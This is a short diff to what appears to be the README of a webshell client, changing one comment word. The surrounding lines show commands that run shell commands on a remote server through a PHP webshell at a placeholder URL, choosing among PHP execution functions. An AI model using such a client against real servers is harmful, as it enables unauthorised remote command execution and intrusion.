@@ -33,7 +33,7 @@ Executing commands on the remote os:
 python3 client.py -u http://example.com/webshell.php -t exec -p "ls"
 
 # specify php function to use when executing a command
-# available php functions are: system (default), passthru, shell_exec, exec, backticks
+# supported php functions are: system (default), passthru, shell_exec, exec, backticks
 python3 client.py -u http://example.com/webshell.php -t exec -p "ls" -e passthru
 ```
 Passing your own php code to be executed:
